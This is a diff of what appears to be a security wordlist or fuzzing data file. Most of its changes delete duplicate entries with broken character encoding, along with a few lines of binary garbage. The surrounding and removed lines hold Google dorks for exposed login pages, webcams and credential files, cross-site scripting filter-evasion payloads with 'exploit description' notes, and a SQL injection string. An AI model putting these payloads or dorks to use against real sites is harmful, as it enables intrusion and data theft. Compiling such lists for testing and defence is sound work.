@@ -173,21 +173,13 @@ $@!(!^&
 (intitle:"phpop: login")|(intext:"you have attempted an action that requires you to be authenticated.")|(intitle:"bookmarker: login")
 (intitle:"please login - forums powered by ubb.threads")|(inurl:login.php "ubb")
 (intitle:"please login - forums powered by wwwthreads")|(inurl:"wwwthreads/login.php")|(inurl:"wwwthreads/login.pl?cat=")
-(intitle:"please login â€“ forums powered by ubb.threads")|(inurl:login.php "ubb")
-(intitle:"please login â€“ forums powered by wwwthreads")|(inurl:"wwwthreads/login.php")|(inurl:"wwwthreads/login.pl?cat=")
 (intitle:"prtg traffic grapher" inurl:"allsensors")|(intitle:"prtg traffic grapher - monitoring results")
-(intitle:"prtg traffic grapher" inurl:"allsensors")|(intitle:"prtg traffic grapher â€“ monitoring results")
 (intitle:"rymo  login")|(intext:"welcome to rymo") -family
 (intitle:"rymo login")|(intext:"welcome to rymo") -family
 (intitle:"shoutcast administrator")|(intext:"u shoutcast d.n.a.s. status")
 (intitle:"visiongs webcam software")|(intext:"powered by visiongs webcam") -showthread.php -showpost.php -"search engine" -computersglobal.com -site:g
 (intitle:"wmsc e-cart administration")|(intitle:"webmystyle e-cart administration")
-(intitle:"wordpress ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Âº setup configuration file")|(inurl:"setup-config.php?step=")
-(intitle:"wordpress â€¦â€¦. setup configuration file")|(inurl:"setup-config.php?step=")
 (intitle:(eyespyfx|opticamfx) "go to camera")|(inurl:servlet/detectbrowser)
-(intitle:â€prtg traffic grapherâ€ inurl:â€allsensorsâ€)|(intitle:â€prtg traffic grapher â€“ monitoring resultsâ€)
-(intitle:â€rymo loginâ€)|(intext:â€welcome to rymoâ€) -family
-(intitle:â€wmsc e-cart administrationâ€)|(intitle:â€webmystyle e-cart administrationâ€)
 (l=*)
 (pinky99*)
 (sanju802*)
@@ -251,7 +243,6 @@ $@!(!^&
 -l`p/xu`tg<5uzv}(|niuld
 -v`h~aqgfjuuz`\\!(,~h~.wmvbo@-@
 .d*)c@rnu\\c`\\alvnlv,vg#i\{)dgds
-.php?menuid=â€
 .xml?uuid=
 /&lt;script((\s+\w+(\s*=\s*(?:&quot;(.)*?&quot;|&apos;(.)*?&apos;|[^&apos;&quot;&gt;\s]+))?)+\s*|\s*)src/i
 /&lt;script((\s+\w+(\s*=\s*(?:&quot;(.)*?&quot;|&apos;(.)*?&apos;|[^&apos;&quot;&gt;\s]+))?)+\s*|\s*)src/i</desc>
@@ -346,7 +337,6 @@ $@!(!^&
 <!-- sample vector --> <img src=xx:xx *chr*onerror=logchr(*num*)> <a href=javascript*chr*:confirm(*num*)>*num*</a>
 <?|()i-
 <a href="data:text/html;base64,phnjcmlwdd5hbgvydcgisgvsbg8ikts8l3njcmlwdd4=">test</a>/(location\s*[\[.])|([.\[]\s*["']?\s*(arguments|dialogarguments|innerhtml|write(ln)?|open(dialog)?|showmodeldialog|cookie|url|documenturi|baseuri|referrer|name|opener|parent|top|content|self|frames)\w)|(localstorage|sessionstorage|database)/
-<div id="1"><form id="test"></form><button form="test" formaction="javascript:alert(1)">x</button>//["'`-->]]>]</div><div id="2"><meta charset="x-imap4-modified-utf7">&adz&agn&ag0&aef&aca&ahm&ahi&ago&ad0&agn&aca&ag8abg&aguacgbyag8acga9ageabablahiadaaoadeakq&acaapabi//["'`-->]]>]</div><div id="3"><meta charset="x-imap4-modified-utf7">&<script&s1&ts&1>alert&a7&(1)&r&ua;&&<&a9&11/script&x&>//["'`-->]]>]</div><div id="4">0?<script>worker("#").onmessage=function(_)eval(_.data)</script> :postmessage(importscripts('data:;base64,cg9zde1lc3nhz2uoj2fszxj0kdepjyk'))//["'`-->]]>]</div><div id="5"><script>crypto.generatecrmfrequest('cn=0',0,0,null,'alert(5)',384,null,'rsa-dual-use')</script>//["'`-->]]>]</div><div id="6"><script>({set/**/$($){_/**/setter=$,_=1}}).$=alert</script>//["'`-->]]>]</div><div id="7"><input onfocus=alert(7) autofocus>//["'`-->]]>]</div><div id="8"><input onblur=alert(8) autofocus><input autofocus>//["'`-->]]>]</div><div id="9"><a style="-o-link:'javascript:alert(9)';-o-link-source:current">x</a>//["'`-->]]>]</div><div id="10"><video poster=javascript:alert(10)//></video>//["'`-->]]>]</div><div id="11"><svg xmlns="http://www.w3.org/2000/svg"><g onload="javascript:alert(11)"></g></svg>//["'`-->]]>]</div><div id="12"><body onscroll=alert(12)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>//["'`-->]]>]</div><div id="13"><x repeat="template" repeat-start="999999">0<y repeat="template" repeat-start="999999">1</y></x>//["'`-->]]>]</div><div id="14"><input pattern=^((a+.)a)+$ value=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!>//["'`-->]]>]</div><div id="15"><script>({0:#0=alert/#0#/#0#(0)})</script>//["'`-->]]>]</div><div id="16">x<x style=`behavior:url(#default#time2)` onbegin=`alert(16)` >//["'`-->]]>]</div><div id="17"><?xml-stylesheet href="javascript:alert(17)"?><root/>//["'`-->]]>]</div><div id="18"><script xmlns="http://www.w3.org/1999/xhtml">&#x61;l&#x65;rt&#40;1)</script>//["'`-->]]>]</div><div id="19"><meta charset="x-mac-farsi">Â¼script Â¾alert(19)//Â¼/script Â¾//["'`-->]]>]</div><div id="20"><script>referenceerror.prototype.__definegetter__('name', function(){alert(20)}),x</script>//["'`-->]]>]</div><div id="21"><script>object.__nosuchmethod__ = function,[{}][0].constructor._('alert(21)')()</script>//["'`-->]]>]</div><div id="22"><input onblur=focus() autofocus><input>//["'`-->]]>]</div><div id="23"><form id=test onforminput=alert(23)><input></form><button form=test onformchange=alert(2)>x</button>//["'`-->]]>]</div><div id="24">1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=alert(24)&gt;`>//["'`-->]]>]</div><div id="25"><script src="#">{alert(25)}</script>;1//["'`-->]]>]</div><div id="26">+adw-html+ad4apa-body+ad4apa-div+ad4-top secret+adw-/div+ad4apa-/body+ad4apa-/html+ad4-.toxmlstring().match(/.*/m),alert(regexp.input);//["'`-->]]>]</div><div id="27"><style>p[foo=bar{}*{-o-link:'javascript:alert(27)'}{}*{-o-link-source:current}*{background:red}]{background:green};</style>//["'`-->]]>]</div>
 <img src=x on*chr*error="javascript:log(*num*)"/>
 <img src=xx:xx onerror=window[['logchr*chr*']](*num*)>
 <ki*)+|
@@ -429,7 +419,6 @@ $@!(!^&
 ^+_!~jsklq38**)_`zz&*1dj(38)&^
 ^=j0h(|ua/~kiy<(9?2ytut\{k[ri1t
 _!(m^
-__ï¾›(,_,*)
 `'"><script>window['log*chr*'](*num*)</script>
 a($@$*())**)$*)a
 a/*?*)
@@ -547,13 +536,8 @@ e;6}(|_k3b^e
 ei03+]cm5?t1y8ua!o[rh!(t0
 ente!(
 euid=
-exploit description: and one last xss attack (using grave accents) to evade this regex: /<script((\s+\w+(\s*=\s*(?:â€(.)*?â€|'(.)*?'|[^'â€>\s]+))?)+\s*|\s*)src/i
-exploit description: another xss to evade this regex filter: /<script((\s+\w+(\s*=\s*(?:â€(.)*?â€|'(.)*?'|[^'â€>\s]+))?)+\s*|\s*)src/i
-exploit description: for performing xss on sites that allow â€<script>â€ but don't allow â€<script src...â€ by way of a regex filter: /<script((\s+\w+(\s*=\s*(?:â€(.)*?â€|'(.)*?'|[^'â€>\s]+))?)+\s*|\s*)src/i this is an important one, because i've seen this regex in the wild)
-exploit description: yet another xss to evade the same filter: /<script((\s+\w+(\s*=\s*(?:â€(.)*?â€|'(.)*?'|[^'â€>\s]+))?)+\s*|\s*)src/i
 ext:dhtml intitle:"document centre|(home)" or intitle:"xerox"
 ext:inc "pwd=" "uid="
-ext:inc â€œpwd=â€ â€œuid=â€
 fbobh_!($0
 fbobh_*)!t
 fbobh_*)(%
@@ -614,11 +598,9 @@ index.html?refid=qq0w&_action=qq1w&kind=qq2w&cs=qq3w&dp=qq4w&trk=qq5w&rnd=qq6w&s
 index.php?uid=587609&ver=8g%20xp
 intitle:"xoops site" intitle:"just use it!" | "powered by xoops (2.0)|(2.0.....)"
 intitle:("trackercam live video")|("trackercam application login")|("trackercam remote") -trackercam.com
-intitle:(â€œtrackercam live videoâ€)|(â€œtrackercam application loginâ€)|(â€œtrackercam remoteâ€) -trackercam.com
 inurl:ugroups.php?uid=
 irj/servlet/prt/portal/prtroot/pcd!(*)
 iuq99cplxqnwtkexqn+3igsuuou=
-jÖù›Ÿ<šeÔ…Ã‚ºñyfıêÅîßÛj*Òbx[[§-âo%Õ¿7ıÿ×Ïöşò·ŒæÃl­Ê*pÿ o÷Šgu$y]£û¼_¯Ç3ãfÙílpét|?t—qº®‡£5Ğ¼hœ€–u$hãÿğçw}[p+ä€€¾yİùw°åÆ¡&ÖÏ^É´Á÷“w7r.³ ÷#€œ²¾¡ƒƒÅ|˜c÷p\íÔåı+æùên’^f˜—Úg›ç®ÜÛo?=t±†’3¯ztù}­îêw®„‘v7m=ê)¶%©Õ”y2eôüùÙãßì¯;zà\n^~ªË|Ú\©|ü¯~Äsyncóô¢/íûÇ÷%"è3.`Ÿ 4†²Üsî‰şº”uunÈnßïƒó#%¼rËÉËÊªcŒ69e_«ìß}£'±~õ>ï‘î Øw'hš1v±äÜ+ûåÿÉ_·¡jŠˆœ±–p}:ÇµÍúgç&«ş€tyƒd•Æ'Û›7µwÛaå¿ryáïy"Ö7¸÷:rŒ±m	heÌ £#”àÓ»÷÷^{çŸ\Üg©Œy |lbêeƒhgpÆ^ädÈÉÂ‚<ãñe±ìéã¤?>áïŸıå¾Ë‹zmpx*jÚ,ò°r9"–*‰Òˆ¨ÑÎŸÛúëoö&¬ƒ;5‹lj :xn¯_Ëó ÷Œu5ÚxŸ _Êjšú$¼…È(åŞaşüå¯>ø—7Ã®¥„8ÌÖ€^úrØ¾*ôÚ>eÂ‚Ë”g–;ÑksÑØe¯¤àˆ×`›†ÈÏ~Ã ŠÁ|~ã|ó/~¸õ¯ÿ~Òaä¡ Áfp€âér{#k#×Ög‡‡g±= Ñ#h°8äpÆ*)şÙ/öş›·¶ÿ“aÌî^ÍªÔhb·Ôíu¢ºÚg [‹‰±öÖ|2hkÏ¾,‰Ç7(ØqãÄ±y(ë‹ËÏçeÛ b¥ršjhÎl©—Øeö’u ¢¹©aŞûß»òáÇ{3µ¦ğ¡ùÀph›laqz3İ% uÓÈ5Ÿm q¤h@b!İ!(yıŸşÍ§?¹t}g´b˜Õxêşúˆé¹ÎÂpÖeàÃxôŠ%:;œkeëfæ¬$ø¸ñûÉª¥Âîş«ê€Ó‚·k6¾ü÷ÿ`ı76{è@2›Ô¯ë:ÍÏÈçm¼a@5Ãaqïæs’oÚö–=:Œşjßşïuğ?şÏ±òœŠ-|¶İi±+–çñ_ÿÕ­ılêeİËĞıØu'l#ˆãwñe©±Ô‹ƒ;Ábr«*ÿİ?¼ôf³Ùráu_geow†¨v½<şñõkÿìÍòo]ö¢d°¬ÃÖÂw±ûqè?ka×fîÅ»Ô¯ë (Ó¶""Ãş¯¿˜¿÷Ş…?=¿¾æ]
 j#sic!(12)
 jan!(($13
 jnfuw*!(@s
@@ -1170,7 +1152,6 @@ mp9fzquzh6n*)wn
 mybasket.aspx?webklavuzuid=1
 myd!(k
 mydove1314qq(*)
-mşÎ§b›ÊdÀ´h‚™¼3j…æœ/šÈ‘vp¾ï*4ù.–¬Ğ*àáÛ%*Ùñíb/Õ8|{çõÛ…sÿc7)w%2“sv?Û¥mtÅ¢Ãñö˜iÛÛÛ\£íÊÕ’œ÷´²şùÛü|Õ¿úşk‡¯–í*îñ±*ºü1°‘_èÆùí9(”ì3ÂcÉhz"˜l&’ty¦r/Àrco(—¿eãÆ¦Õ©cÑÔh,4qØ›85±èhÙš±ï~cÅ<j†fòû}Ã§ócaùËØü}éd4>¬†g†òcét(üâÆa#ıb8123ÒÆ&ù2Â/2‘üæÂÕ¨q#]øµşdhÈhnŠ‡d‡cic ]şöß3ri3¦Ç"ù/Š…â/úzŸé	­¡¡!.«'šjq#¹y_0ğµşİ_ö÷÷õo^«ÉÑ´‘Œ‡bÅÁ5aw?#¡°!Œ#¡˜‡b±ÒĞ¶Õ¥<¡ÕkámxÈe%õŸıuxt-–xıfk'´±dÌ§¡lzj<²3´c}è±ğû¾n$†c«ßŒ¼º–5âr¦t7Æµñh|(1~¿iñå>v6èšÒ’«Åù‚dpğ/Ÿ¿½q×äÂµo¤´pbè[÷o”zÌÅŒdzÛúïüõ¡Äzà‰¢²c˜…©a¨bÒ¡™Æëk2y	ˆt:1zn$s)mÕÁ½„/ê»ş:µÖ»Â÷|‘+œl¤r«¦úÑ‘xŸ?;7šÒâ‰4l,1né"™h¤‹blŸİñh¢ˆí‰¦k¦l¡šµ
 n(|
 na1973!(&#
 nadirbh1994!(($
@@ -1280,7 +1261,6 @@ u(|o_v!y]r#l\{!oepcw~2in\\sajz~j
 u*)9wnkvdqa5xb
 u.php?a=info&uid=
 ubb.threads")|(inurl:login.php "ubb")
-ubb.threadsâ€)|(inurl:login.php â€œubbâ€)
 ucweb/2.0 (midp-2.0; u; adr 4.0.4; id; a7*) u2/1.0.0 ucbrowser/9.1.1.420 u2/1.0.0 ponsel
 ucweb/2.0 (midp-2.0; u; adr 4.2.2; en-us; a7*) u2/1.0.0 ucbrowser/10.6.0.706 u2/1.0.0 mobile
 ucweb/2.0 (midp-2.0; u; adr 4.2.2; en-us; a7s*) u2/1.0.0 ucbrowser/10.2.0.584 u2/1.0.0 mobile
@@ -1321,7 +1301,6 @@ wps/portal/plygem/investorrelations/investorrelationshome/20odc=
 wslhd!(*()^@#
 wspj6c!(**
 wwwthreads")|(inurl:"wwwthreads/login.php")|(inurl:"wwwthreads/login.pl?cat=")
-wwwthreadsâ€)|(inurl:â€wwwthreads/login.phpâ€)|(inurl:â€wwwthreads/login.pl?cat=â€)
 x' and 1=(select count(*) from tabname); --
 x-500: c=gb@o=nexor ltd@cn=martijn koster
 x-envelope-to: /cn=robots/@nexor.co.uk
